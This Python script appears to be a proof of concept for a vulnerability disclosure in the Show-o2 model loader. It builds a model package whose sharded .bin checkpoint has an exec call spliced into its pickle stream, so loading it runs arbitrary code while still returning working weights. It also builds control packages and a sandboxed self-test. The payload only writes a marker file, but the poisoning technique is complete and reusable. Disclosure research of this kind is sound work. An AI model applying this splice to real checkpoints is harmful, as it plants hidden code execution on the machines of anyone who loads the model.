#!/usr/bin/env python
# make_poc.py - build the three Show-o2 model packages used by this PoC.
#
# Usage (run inside the PoC work dir):
#   python make_poc.py            # build showo2_evil_pkg / showo2_st_control_pkg / showo2_noindex_ctl
#   python make_poc.py --clean    # remove the generated dirs and marker files
#
# Positive package (showo2_evil_pkg):
#   config.json                         Showo2Qwen2_5 config (points at the two tiny sub-configs)
#   tiny_qwen/config.json               miniature Qwen2Config, lets __init__ build Qwen2ForCausalLM offline
#   tiny_siglip/...                     miniature SigLIP weights, required by Showo2Qwen2_5.__init__
#   diffusion_pytorch_model.bin.index.json  sharded index (diffusers naming); weight_map selects the pickle-backed .bin
#   pytorch_model-00001-of-00001.bin    torch zip shard whose data.pkl executes the payload first, then
#                                       yields the genuine state dict, so the checkpoint stays functional
#   evil_module.py                      INERT B2 probe: would write a marker if anything imported it.
#                                       The Show-o2 loader never imports it - the effect comes from the .bin.
#
# Controls:
#   showo2_st_control_pkg   same package shape, but weight_map points at a .safetensors shard
#                           (benign: safetensors cannot carry the pickle payload)
#   showo2_noindex_ctl      NO index file; pytorch_model.bin holds the exact same poisoned bytes
#                           (same sha256) -> the non-sharded route loads it through diffusers'
#                           load_state_dict, which passes weights_only=True and rejects it.

import hashlib
import json
import os
import pickle
import shutil
import subprocess
import sys
import tempfile
import zipfile

# diffusers naming conventions (the Show-o2 vendored loader resolves these names)
INDEX_NAME = "diffusion_pytorch_model.bin.index.json"   # WEIGHTS_INDEX_NAME in diffusers
DIRECT_WEIGHTS_NAME = "pytorch_model.bin"               # WEIGHTS_NAME defined in Show-o2 vendored modeling_utils.py:48

HERE = os.path.dirname(os.path.abspath(__file__))
SRC_SHOWO2 = os.path.join(HERE, "Show-o-45a5a2de01d1", "show-o2")
sys.path.insert(0, SRC_SHOWO2)

PKGS = ["showo2_evil_pkg", "showo2_st_control_pkg", "showo2_noindex_ctl"]
MARKER = "RCE_MARKER_SHOWO2_BIN_INDEX.txt"
B2_MARKER = "RCE_MARKER_B2_IMPORT.txt"

# Payload executed by torch.load inside the victim process (arbitrary code execution).
PAYLOAD_CODE = (
    "import datetime, getpass, platform\n"
    "line = 'ARBITRARY CODE EXECUTED  user=%s  host=%s  time=%s' % ("
    "getpass.getuser(), platform.node(), datetime.datetime.now().isoformat(timespec='seconds'))\n"
    "print('[payload] ' + line)\n"
    "open('" + MARKER + "', 'w').write(line + chr(10))\n"
)

EVIL_MODULE = '''# evil_module.py - INERT PROBE (B2). If anything imported this module it would
# drop RCE_MARKER_B2_IMPORT.txt. The Show-o2 loading chain never imports it, which
# is exactly what this probe is here to disprove.
import os
_here = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(_here, "RCE_MARKER_B2_IMPORT.txt"), "w") as _f:
    _f.write("evil_module was imported - B2 route active\\n")
'''

TINY_QWEN_CONFIG = {
    "model_type": "qwen2",
    "architectures": ["Qwen2ForCausalLM"],
    "hidden_size": 32,
    "intermediate_size": 64,
    "num_hidden_layers": 1,
    "num_attention_heads": 4,
    "num_key_value_heads": 2,
    "vocab_size": 128,
    "max_position_embeddings": 256,
    "rms_norm_eps": 1e-06,
    "rope_theta": 10000.0,
    "use_cache": True,
    "torch_dtype": "float32",
}

TINY_SIGLIP_CONFIG = {
    "vision_config": {
        "hidden_size": 32,
        "intermediate_size": 64,
        "num_hidden_layers": 2,
        "num_attention_heads": 2,
        "image_size": 28,
        "patch_size": 14,
        "num_channels": 3,
    },
    "text_config": {
        "hidden_size": 32,
        "intermediate_size": 64,
        "num_hidden_layers": 2,
        "num_attention_heads": 2,
        "vocab_size": 128,
        "max_position_embeddings": 64,
    },
}

SHOWO2_KWARGS = dict(
    llm_vocab_size=128,
    llm_model_path="tiny_qwen",
    load_from_showo=True,
    image_latent_dim=16,
    image_latent_height=4,
    image_latent_width=4,
    video_latent_height=4,
    video_latent_width=4,
    patch_size=2,
    hidden_size=64,
    clip_latent_dim=64,
    num_diffusion_layers=2,
    add_time_embeds=True,
    add_qk_norm=False,
    clip_pretrained_model_path="tiny_siglip",
)


class _Exec:
    """Pickle reduce stub: calls a builtin with one argument when unpickled."""

    def __init__(self, func, arg):
        self.func, self.arg = func, arg

    def __reduce__(self):
        return (self.func, (self.arg,))


def splice_pickle(payload_func, payload_arg, inner_pkl):
    """Prepend a single reduce call to an existing pickle stream.

    Byte layout: PROTO2 GLOBAL <func> arg TUPLE REDUCE  ->  POP (b'0')  ->  inner stream.
    The unpickler executes the call, discards its return value and yields the
    inner object, so a state-dict checkpoint keeps loading normally.
    """
    head = pickle.dumps(_Exec(payload_func, payload_arg), protocol=2)
    assert head.endswith(b"."), "unexpected pickle trailer"
    return head[:-1] + b"0" + inner_pkl


def poisoned_shard_bytes(state_dict, payload_code):
    """torch.save the genuine state dict, then rewrite data.pkl inside the zip."""
    tmp = tempfile.NamedTemporaryFile(suffix=".bin", delete=False)
    tmp.close()
    try:
        torch_save(state_dict, tmp.name)
        with zipfile.ZipFile(tmp.name) as z:
            members = [(i.filename, z.read(i.filename), i.compress_type) for i in z.infolist()]
    finally:
        os.unlink(tmp.name)
    pkl_name = [n for n, _, _ in members if n.endswith("data.pkl")]
    assert len(pkl_name) == 1, members
    pkl_name = pkl_name[0]
    out = tempfile.NamedTemporaryFile(suffix=".bin", delete=False)
    out.close()
    with zipfile.ZipFile(out.name, "w") as z:
        for name, data, ctype in members:
            if name == pkl_name:
                data = splice_pickle(exec, payload_code, data)
            z.writestr(zipfile.ZipInfo(name), data, ctype)
    with open(out.name, "rb") as f:
        blob = f.read()
    os.unlink(out.name)
    return blob


def torch_save(obj, path):
    import torch

    torch.save(obj, path, _use_new_zipfile_serialization=True)


def self_test(state_dict):
    """1) splice mechanics with a harmless print payload; 2) the real exec payload
    fired inside a sandboxed subprocess with its own cwd."""
    import torch

    tmp = tempfile.NamedTemporaryFile(suffix=".bin", delete=False)
    tmp.close()
    try:
        blob = poisoned_shard_bytes(state_dict, "print('[selftest] splice ok')")
        with open(tmp.name, "wb") as f:
            f.write(blob)
        loaded = torch.load(tmp.name, weights_only=False, map_location="cpu")
        assert isinstance(loaded, dict) and set(loaded) == set(state_dict)
    finally:
        os.unlink(tmp.name)

    sandbox = tempfile.mkdtemp()
    try:
        blob = poisoned_shard_bytes(state_dict, PAYLOAD_CODE)
        shard = os.path.join(sandbox, "shard.bin")
        with open(shard, "wb") as f:
            f.write(blob)
        code = (
            "import torch, os, sys; d = torch.load(sys.argv[1], weights_only=False, map_location='cpu'); "
            "assert isinstance(d, dict) and os.path.exists(%r)" % MARKER
        )
        r = subprocess.run([sys.executable, "-c", code, shard], cwd=sandbox,
                           capture_output=True, text=True, timeout=300)
        assert r.returncode == 0, r.stderr[-1500:]
        assert os.path.exists(os.path.join(sandbox, MARKER)), r.stdout
    finally:
        shutil.rmtree(sandbox, ignore_errors=True)


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def clean():
    for d in PKGS + ["showo2_build", "tiny_qwen", "tiny_siglip"]:
        shutil.rmtree(os.path.join(HERE, d), ignore_errors=True)
    for f in [MARKER, "SHA256SUMS.txt"]:
        p = os.path.join(HERE, f)
        if os.path.exists(p):
            os.unlink(p)
    print("cleaned")


def build_reference():
    """Create the two tiny sub-configs and a tiny reference Showo2Qwen2_5, return
    (state_dict, config_dict) used to pack the model packages."""
    import torch
    from transformers import SiglipConfig
    from models.modeling_siglip import SiglipModel  # vendored in Show-o2
    from models.modeling_showo2_qwen2_5 import Showo2Qwen2_5

    build = os.path.join(HERE, "showo2_build")
    os.makedirs(build, exist_ok=True)

    tiny_qwen = os.path.join(build, "tiny_qwen")
    os.makedirs(tiny_qwen, exist_ok=True)
    with open(os.path.join(tiny_qwen, "config.json"), "w", encoding="utf-8") as f:
        json.dump(TINY_QWEN_CONFIG, f, indent=2)

    tiny_siglip = os.path.join(build, "tiny_siglip")
    if not os.path.exists(os.path.join(tiny_siglip, "model.safetensors")):
        SiglipModel(SiglipConfig(**TINY_SIGLIP_CONFIG)).save_pretrained(tiny_siglip)

    # Showo2Qwen2_5.__init__ resolves the sub-config paths against the CWD
    cwd = os.getcwd()
    os.chdir(build)
    try:
        torch.manual_seed(0)
        model = Showo2Qwen2_5(**SHOWO2_KWARGS)
    finally:
        os.chdir(cwd)
    model.save_pretrained(build)

    with open(os.path.join(build, "config.json"), "r", encoding="utf-8") as f:
        config = json.load(f)

    state_dict = {k: v.detach().clone().contiguous() for k, v in model.state_dict().items()}
    del model
    return state_dict, config, build


def pack_packages(state_dict, config, build):
    import torch
    from safetensors.torch import save as st_save

    blob_bin = poisoned_shard_bytes(state_dict, PAYLOAD_CODE)
    blob_st = st_save({k: v.clone() for k, v in state_dict.items()},
                      metadata={"format": "pt"})
    total_size = int(sum(v.numel() * v.element_size() for v in state_dict.values()))

    for pkg in PKGS:
        pdir = os.path.join(HERE, pkg)
        shutil.rmtree(pdir, ignore_errors=True)
        os.makedirs(pdir)
        for sub in ("tiny_qwen", "tiny_siglip"):
            shutil.copytree(os.path.join(build, sub), os.path.join(pdir, sub))
        cfg = dict(config)
        cfg["llm_model_path"] = "%s/tiny_qwen" % pkg
        cfg["clip_pretrained_model_path"] = "%s/tiny_siglip" % pkg
        with open(os.path.join(pdir, "config.json"), "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)

        if pkg == "showo2_evil_pkg":
            shard_name = "pytorch_model-00001-of-00001.bin"
            with open(os.path.join(pdir, shard_name), "wb") as f:
                f.write(blob_bin)
            with open(os.path.join(pdir, "evil_module.py"), "w", encoding="utf-8") as f:
                f.write(EVIL_MODULE)
        elif pkg == "showo2_st_control_pkg":
            shard_name = "pytorch_model-00001-of-00001.safetensors"
            with open(os.path.join(pdir, shard_name), "wb") as f:
                f.write(blob_st)
        else:  # showo2_noindex_ctl: same poisoned bytes, direct route, no index file
            shard_name = DIRECT_WEIGHTS_NAME
            with open(os.path.join(pdir, shard_name), "wb") as f:
                f.write(blob_bin)

        if pkg != "showo2_noindex_ctl":
            index = {
                "metadata": {"total_size": total_size},
                "weight_map": {"showo.model.embed_tokens.weight": shard_name},
            }
            with open(os.path.join(pdir, INDEX_NAME), "w", encoding="utf-8") as f:
                json.dump(index, f, indent=2)

    lines = []
    for pkg in PKGS:
        pdir = os.path.join(HERE, pkg)
        for root, _dirs, files in os.walk(pdir):
            for fn in sorted(files):
                p = os.path.join(root, fn)
                lines.append("%s  %s" % (sha256(p), os.path.relpath(p, HERE)))
    with open(os.path.join(HERE, "SHA256SUMS.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    return blob_bin


def main():
    if "--clean" in sys.argv:
        clean()
        return

    print("[1/4] building tiny sub-configs (tiny_qwen, tiny_siglip)")
    state_dict, config, build = build_reference()
    print("      reference model state dict: %d tensors" % len(state_dict))

    print("[2/4] self-test: poisoned shard still loads and returns the genuine state dict")
    self_test(state_dict)
    print("      self-test OK (print-splice + sandboxed exec payload)")

    print("[3/4] packing model packages")
    blob = pack_packages(state_dict, config, build)

    print("[4/4] SHA256SUMS.txt written")
    print()
    print("showo2_evil_pkg         %s -> pytorch_model-00001-of-00001.bin   (pickle shard, payload inside)" % INDEX_NAME)
    print("showo2_st_control_pkg   %s -> pytorch_model-00001-of-00001.safetensors (benign)" % INDEX_NAME)
    print("showo2_noindex_ctl      no index; %s = same poisoned bytes" % DIRECT_WEIGHTS_NAME)
    print("                        sha256(pytorch_model-00001-of-00001.bin) = sha256(%s)" % DIRECT_WEIGHTS_NAME)
    h1 = sha256(os.path.join(HERE, "showo2_evil_pkg", "pytorch_model-00001-of-00001.bin"))
    h2 = sha256(os.path.join(HERE, "showo2_noindex_ctl", DIRECT_WEIGHTS_NAME))
    print("                        %s... / %s...  identical: %s" % (h1[:16], h2[:16], h1 == h2))


if __name__ == "__main__":
    main()
